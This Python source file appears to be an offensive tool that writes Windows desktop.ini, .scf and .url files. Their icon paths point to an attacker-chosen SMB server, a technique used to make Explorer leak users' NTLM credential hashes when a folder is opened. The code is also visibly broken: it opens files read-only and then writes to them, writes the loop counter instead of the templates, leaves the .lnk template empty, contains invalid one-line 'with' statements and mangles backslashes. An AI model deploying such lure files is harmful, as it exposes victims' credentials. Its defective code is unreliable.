#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Rainer Christian Bjoern Herold

def Generate_Files(mode, target_server, file_name, output_location):
    ini_file = f"""[.ShellClassInfo]
IconResource=\\{target_server}\aa"""

    lnk_file = f"""
    """

    scf_file = f"""[Shell]
Command=2
IconFile=\\{target_server}\tools\einherjer_malicious.ico
[Taskbar]
Command=ToggleDesktop"""

    url_file = f"""[InternetShortcut]
URL=setup
WorkingDirectory=setup
IconFile=\\{target_server}\%USERNAME%.icon
IconIndex=1"""

    Array_Modes, Array_Temp = [ini_file, lnk_file, scf_file, url_file], []

    if (mode == 'all'):
        for _ in range (0, len(Array_Modes)):
            if (_ == 0):   File_Name = f'{output_location}/{file_name}.ini'
            elif (_ == 1): File_Name = f'{output_location}/{file_name}.lnk'
            elif (_ == 2): File_Name = f'{output_location}/{file_name}.scf'
            elif (_ == 3): File_Name = f'{output_location}/{file_name}.url'

            with open(File_Name) as f:
                f.write(_)

            if (File_Name not in Array_Temp): Array_Temp.append(File_Name)

        return Array_Temp
    
    elif (mode == 'ini'): with open(f'{output_location}/{file_name}.ini') as f: f.write(_)
    elif (mode == 'lnk'): with open(f'{output_location}/{file_name}.lnk') as f: f.write(_)
    elif (mode == 'scf'): with open(f'{output_location}/{file_name}.scf') as f: f.write(_)
    elif (mode == 'url'): with open(f'{output_location}/{file_name}.url') as f: f.write(_)
